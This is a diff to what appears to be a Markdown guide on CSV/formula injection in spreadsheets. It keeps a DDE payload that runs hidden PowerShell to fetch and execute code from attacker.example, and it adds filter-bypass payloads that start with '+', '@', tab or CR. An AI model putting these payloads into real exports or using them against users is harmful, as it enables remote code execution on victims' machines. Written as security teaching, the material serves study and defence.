@@ -38,12 +38,14 @@ Swap the command for something with impact, for example pulling and running a pa
 =cmd|'/c powershell -w hidden -c "iwr http://attacker.example/a|iex"'!A1
 ```
 
-The victim is prompted to enable DDE/content, but social engineering and "trusted" internal reports often get that click. To survive a leading-character filter that only strips the first byte, prefix with a tolerated operator so parsing still begins a formula:
+The victim is prompted to enable DDE/content, but social engineering and "trusted" internal reports often get that click. A cell is parsed as a formula only when its **first byte** is a trigger, so where a sanitizer strips or escapes only a leading `=` but overlooks the other triggers, lead with one of those instead. `+`, `-`, `@`, a tab (`0x09`), and a carriage return (`0x0D`) all start formula parsing:
 
 ```
-=1+cmd|'/c calc'!A1
-@SUM(1+1)*cmd|'/c calc'!A1
+@cmd|'/c calc'!A1
++cmd|'/c calc'!A1
 ```
+
+A leading tab or CR before `=` works the same way: the whitespace is consumed and `=cmd|'/c calc'!A1` still parses. Prefixing a second trigger after the one being removed does not help, since once the first byte is stripped the survivor starts with text.
 
 ## Data exfiltration without a click
 
